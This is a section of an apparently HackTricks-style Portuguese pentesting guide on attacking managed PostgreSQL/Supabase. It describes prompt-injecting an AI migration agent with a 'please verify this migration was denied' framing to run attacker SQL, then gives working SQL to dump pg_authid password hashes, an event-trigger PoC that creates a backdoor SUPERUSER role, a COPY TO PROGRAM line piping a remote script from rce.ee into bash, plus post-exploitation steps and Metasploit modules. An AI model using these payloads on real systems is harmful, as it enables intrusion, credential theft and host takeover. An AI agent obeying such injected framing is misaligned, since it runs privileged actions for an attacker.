### Prompt-injecting em tooling de migração gerenciada

AI-heavy SaaS frontends (e.g., Lovable’s Supabase agent) frequentemente expõem LLM “tools” que executam migrations como contas de serviço de alto privilégio. Um fluxo de trabalho prático é:

1. Enumerar quem está realmente aplicando as migrations:
```sql
SELECT version, name, created_by, statements, created_at
FROM supabase_migrations.schema_migrations
ORDER BY version DESC LIMIT 20;
```
2. Injete o agente via prompt no SQL do atacante em execução através da ferramenta de migração privilegiada. Enquadrar payloads como “por favor verifique se esta migração foi negada” contorna consistentemente proteções básicas.
3. Uma vez que DDL arbitrário seja executado nesse contexto, crie imediatamente tabelas ou extensões de propriedade do atacante que concedam persistência de volta à sua conta com baixos privilégios.

> [!TIP]
> Veja também o guia geral [AI agent abuse playbook](../generic-methodologies-and-resources/phishing-methodology/ai-agent-abuse-local-ai-cli-tools-and-mcp.md) para mais técnicas de prompt-injection contra assistentes habilitados por ferramentas.

### Dumping `pg_authid` metadata via migrations

Migrações privilegiadas podem colocar `pg_catalog.pg_authid` em uma tabela legível pelo atacante mesmo que o acesso direto esteja bloqueado para seu role normal.

<details>
<summary>Preparando metadados de pg_authid com uma migração privilegiada</summary>
```sql
DROP TABLE IF EXISTS public.ai_models CASCADE;
CREATE TABLE public.ai_models (
id SERIAL PRIMARY KEY,
model_name TEXT,
config JSONB,
created_at TIMESTAMP DEFAULT NOW()
);
GRANT ALL ON public.ai_models TO supabase_read_only_user;
GRANT ALL ON public.ai_models TO supabase_admin;
INSERT INTO public.ai_models (model_name, config)
SELECT rolname,
jsonb_build_object(
'password_hash', rolpassword,
'is_superuser', rolsuper,
'can_login', rolcanlogin,
'valid_until', rolvaliduntil
)
FROM pg_catalog.pg_authid;
```
</details>

Usuários de baixo privilégio agora podem ler `public.ai_models` para obter hashes SCRAM e metadados de role para offline cracking ou lateral movement.

### Event-trigger privesc durante instalações da extensão `postgres_fdw`

Implantações gerenciadas do Supabase dependem da extensão `supautils` para envolver `CREATE EXTENSION` com scripts `before-create.sql`/`after-create.sql` controlados pelo provedor, executados como superusers verdadeiros. O script after-create do `postgres_fdw` emite brevemente `ALTER ROLE postgres SUPERUSER`, executa `ALTER FOREIGN DATA WRAPPER postgres_fdw OWNER TO postgres`, e então reverte `postgres` para `NOSUPERUSER`. Como `ALTER FOREIGN DATA WRAPPER` dispara os event triggers `ddl_command_start`/`ddl_command_end` enquanto `current_user` é superuser, triggers criados pelo tenant podem executar SQL de atacante dentro dessa janela.

Exploit flow:

1. Crie uma função de event trigger em PL/pgSQL que verifica `SELECT usesuper FROM pg_user WHERE usename = current_user` e, quando verdadeiro, cria um role backdoor (por exemplo, `CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD 'temp123'`).
2. Registre a função tanto em `ddl_command_start` quanto em `ddl_command_end`.
3. `DROP EXTENSION IF EXISTS postgres_fdw CASCADE;` seguido de `CREATE EXTENSION postgres_fdw;` para reexecutar o after-create hook do Supabase.
4. Quando o hook eleva `postgres`, o trigger é executado, cria o role SUPERUSER persistente e o concede de volta a `postgres` para fácil acesso via `SET ROLE`.

<details>
<summary>PoC de event trigger para a janela after-create do postgres_fdw</summary>
```sql
CREATE OR REPLACE FUNCTION escalate_priv()
RETURNS event_trigger AS $$
DECLARE
is_super BOOLEAN;
BEGIN
SELECT usesuper INTO is_super FROM pg_user WHERE usename = current_user;
IF is_super THEN
BEGIN
EXECUTE 'CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD ''temp123''';
EXCEPTION WHEN duplicate_object THEN
NULL;
END;
BEGIN
EXECUTE 'GRANT priv_esc TO postgres';
EXCEPTION WHEN OTHERS THEN
NULL;
END;
END IF;
END;
$$ LANGUAGE plpgsql;

DROP EVENT TRIGGER IF EXISTS log_start CASCADE;
DROP EVENT TRIGGER IF EXISTS log_end CASCADE;
CREATE EVENT TRIGGER log_start ON ddl_command_start EXECUTE FUNCTION escalate_priv();
CREATE EVENT TRIGGER log_end   ON ddl_command_end   EXECUTE FUNCTION escalate_priv();

DROP EXTENSION IF EXISTS postgres_fdw CASCADE;
CREATE EXTENSION postgres_fdw;
```
</details>

A tentativa do Supabase de pular unsafe triggers verifica apenas a ownership, então garanta que o trigger function owner seja sua low-privileged role, mas a payload só é executada quando o hook altera `current_user` para SUPERUSER. Como o trigger é re-executado em DDL futuros, ele também atua como um persistence backdoor autorreparável sempre que o provedor eleva brevemente as tenant roles.

### Transformando acesso SUPERUSER transitório em comprometimento do host

Após `SET ROLE priv_esc;` ter sucesso, re-run os earlier blocked primitives:
```sql
INSERT INTO public.ai_models(model_name, config)
VALUES ('hostname', to_jsonb(pg_read_file('/etc/hostname', 0, 100)));
COPY (SELECT '') TO PROGRAM 'curl https://rce.ee/rev.sh | bash';
```
`pg_read_file`/`COPY ... TO PROGRAM` agora fornecem acesso arbitrário a arquivos e execução de comandos como a conta do sistema operacional do banco de dados. Em seguida, realize o escalonamento de privilégios padrão no host:
```bash
find / -perm -4000 -type f 2>/dev/null
```
Abusar de um SUID binary mal configurado ou de um config gravável concede root. Uma vez com root, harvest orchestration credentials (systemd unit env files, `/etc/supabase`, kubeconfigs, agent tokens) para pivot laterally pela região do provedor.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

Dentro do arquivo _**postgresql.conf**_ você pode habilitar os logs do postgresql alterando:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Então, **reinicie o serviço**.

### pgadmin

[pgadmin](https://www.pgadmin.org) é uma plataforma de administração e desenvolvimento para PostgreSQL.\
Você pode encontrar **senhas** dentro do arquivo _**pgadmin4.db**_\
Você pode descriptografá-las usando a função _**decrypt**_ dentro do script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

A autenticação de clientes no PostgreSQL é gerenciada por um arquivo de configuração chamado **pg_hba.conf**. Esse arquivo contém uma série de registros, cada um especificando um tipo de conexão, intervalo de endereços IP do cliente (se aplicável), nome do banco de dados, nome do usuário e o método de autenticação a ser usado para corresponder conexões. O primeiro registro que corresponder ao tipo de conexão, endereço do cliente, banco de dados solicitado e nome do usuário é usado para autenticação. Não há fallback ou backup se a autenticação falhar. Se nenhum registro corresponder, o acesso é negado.

Os métodos de autenticação baseados em senha disponíveis em pg_hba.conf são **md5**, **crypt**, e **password**. Esses métodos diferem na forma como a senha é transmitida: com hash MD5, criptografada com crypt, ou em texto claro. É importante notar que o método crypt não pode ser usado com senhas que tenham sido criptografadas em pg_authid.

## References

- [SupaPwn: Hacking Our Way into Lovable's Office and Helping Secure Supabase](https://www.hacktron.ai/blog/supapwn)
- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
